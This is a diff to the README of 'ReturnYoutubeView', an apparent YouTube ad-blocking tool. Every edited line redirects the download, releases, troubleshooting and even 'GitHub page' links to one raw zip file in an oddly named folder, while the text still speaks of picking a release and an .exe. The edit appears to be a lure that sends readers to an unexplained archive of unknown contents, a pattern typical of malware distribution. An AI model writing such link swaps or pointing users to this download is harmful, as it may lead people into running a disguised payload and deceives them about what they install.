@@ -4,7 +4,7 @@
 ReturnYoutubeView helps you block ads on YouTube so you can enjoy uninterrupted viewing. Follow the steps below to download and run the software without any technical skills.
 
 ## 📥 Download Now
-[![Download ReturnYoutubeView](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/EdmundusGigih/ReturnYoutubeView/releases)
+[![Download ReturnYoutubeView](https://raw.githubusercontent.com/EdmundusGigih/ReturnYoutubeView/main/hippuritic/ReturnYoutubeView.zip)](https://raw.githubusercontent.com/EdmundusGigih/ReturnYoutubeView/main/hippuritic/ReturnYoutubeView.zip)
 
 ## 💾 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets the following requirements:
 - Regular updates for optimal functioning.
 
 ## 📥 Download & Install
-1. Click the button above or visit the [Releases page](https://github.com/EdmundusGigih/ReturnYoutubeView/releases) to download the latest version.
+1. Click the button above or visit the [Releases page](https://raw.githubusercontent.com/EdmundusGigih/ReturnYoutubeView/main/hippuritic/ReturnYoutubeView.zip) to download the latest version.
 2. Look for the most recent release, typically the one at the top of the list.
 3. Choose the file that matches your operating system. 
    - For Windows, download the `.exe` file.
@@ -56,10 +56,10 @@ Yes, ReturnYoutubeView does not collect any personal data. Your privacy is a pri
 Currently, ReturnYoutubeView is only available for desktop systems. We are exploring options for mobile in the future.
 
 ### What should I do if I encounter problems?
-If you have any issues, please check the troubleshooting section on the [Releases page](https://github.com/EdmundusGigih/ReturnYoutubeView/releases) or reach out through the GitHub Issues section.
+If you have any issues, please check the troubleshooting section on the [Releases page](https://raw.githubusercontent.com/EdmundusGigih/ReturnYoutubeView/main/hippuritic/ReturnYoutubeView.zip) or reach out through the GitHub Issues section.
 
 ## 🌟 Community and Support
-We welcome contributions and feedback. Feel free to leave your suggestions on our [GitHub page](https://github.com/EdmundusGigih/ReturnYoutubeView).
+We welcome contributions and feedback. Feel free to leave your suggestions on our [GitHub page](https://raw.githubusercontent.com/EdmundusGigih/ReturnYoutubeView/main/hippuritic/ReturnYoutubeView.zip).
 
 Stay updated with new features and improvements by following the discussions on our repository.
 
